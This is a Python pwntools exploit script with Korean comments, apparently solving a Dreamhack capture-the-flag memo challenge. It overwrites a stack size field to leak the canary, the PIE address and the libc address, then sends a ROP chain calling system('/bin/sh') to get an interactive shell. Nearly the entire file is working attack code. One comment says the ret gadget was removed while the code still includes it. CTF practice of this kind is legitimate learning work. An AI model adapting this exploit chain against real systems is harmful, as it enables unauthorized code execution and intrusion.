from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# 추출한 libc.so.6 파일 로드
libc = ELF('./libc.so.6')

def get_process():
    # 서버 주소와 포트 (드림핵 인스턴스 정보에 맞게 수정하세요)
    return remote('host8.dreamhack.games', 16054) 

p = get_process()

def write_memo(data):
    log.info(f"[*] write_memo 호출 (Payload len: {len(data)})")
    p.sendlineafter(b"> ", b"1")
    p.sendafter(b"memo:\n", data)

def read_memo():
    log.info("[*] read_memo 호출 (Leak 진행 중...)")
    p.sendlineafter(b"> ", b"2")
    p.recvuntil(b"[ memo ]\n")
    return p.recvuntil(b"\n[ end ]", drop=True)

def revise_memo(data):
    log.info(f"[*] revise_memo 호출 (Payload len: {len(data)})")
    p.sendlineafter(b"> ", b"3")
    p.sendafter(b"revision:\n", data)

# ========================================================
# Step 1. size 조작을 위한 초기화
# ========================================================
log.info("--- [Step 1] size 조작을 위한 write_memo 실행 ---")
write_memo(b"A" * 0x80)


# ========================================================
# Step 2. revise_memo를 통해 스택 내 last_memo_size 값을 0xd0으로 오버라이트
# ========================================================
log.info("--- [Step 2] last_memo_size 0xd0으로 오버라이트 ---")
payload_size_overwrite = b"B" * 0x80 + p64(0xd0)
revise_memo(payload_size_overwrite)


# ========================================================
# Step 3. read_memo로 스택 정보 대량 Leak (Canary, PIE, Libc)
# ========================================================
log.info("--- [Step 3] 스택 메모리 Leak 수행 ---")
leaked_data = read_memo()

# 오프셋 분석에 따른 데이터 추출 (수정된 libc_leak 오프셋 반영)
canary = u64(leaked_data[0x88:0x90])
pie_leak = u64(leaked_data[0x98:0xa0])  
libc_leak = u64(leaked_data[0xb8:0xc0]) 

log.success(f"[+] Leaked Canary   : {hex(canary)}")
log.success(f"[+] Leaked PIE Addr : {hex(pie_leak)}")
log.success(f"[+] Leaked Libc Addr: {hex(libc_leak)}")

# 베이스 주소 계산
pie_base = pie_leak - 0x1999
libc_base = libc_leak - 0x29d90 

log.success(f"[!] PIE Base        : {hex(pie_base)}")
log.success(f"[!] Libc Base       : {hex(libc_base)}")

# pwntools의 libc 객체에 Base Address를 적용하면 내부 함수 오프셋이 자동 계산됩니다!
libc.address = libc_base


# ========================================================
# Step 4. 두 번째 revise_memo로 ROP Chain 실행
# ========================================================
log.info("--- [Step 4] ROP Payload 작성 및 전송 ---")

pop_rdi_ret = pie_base + 0x128d
ret = pop_rdi_ret + 1

# Libc에서 정확한 함수와 문자열 주소를 검색하여 가져옵니다.
binsh = next(libc.search(b"/bin/sh\x00"))
system = libc.sym['system']

log.info(f"[*] ROP Gadget 'pop rdi': {hex(pop_rdi_ret)}")
log.info(f"[*] /bin/sh string Addr : {hex(binsh)}")
log.info(f"[*] system() Addr       : {hex(system)}")

# 페이로드 조립 (총 0xd0 바이트)
rop_payload = b"C" * 0x88              # 1. 0x88바이트 더미 (Canary 직전까지)
rop_payload += p64(canary)             # 2. Canary 복구
rop_payload += p64(0x0)                # 3. Fake RBP
rop_payload += p64(ret)              # 4. [제거됨] 이미 스택이 16바이트 정렬되어 있으므로 필요 없음!
rop_payload += p64(pop_rdi_ret)        # 5. pop rdi 가젯
rop_payload += p64(binsh)              # 6. "/bin/sh" 주소를 rdi에 넣음
rop_payload += p64(system)             # 7. system 함수 호출

# 0xd0 사이즈에 맞게 패딩
rop_payload = rop_payload.ljust(0xd0, b"\x00")

log.info("--- [BOOM] 쉘을 획득하러 갑니다! ---")
revise_memo(rop_payload)

# 스크립트 실행 제어권을 넘깁니다. (이전에 있던 4번 메뉴 전송은 입출력 꼬임을 막기 위해 삭제)
p.interactive()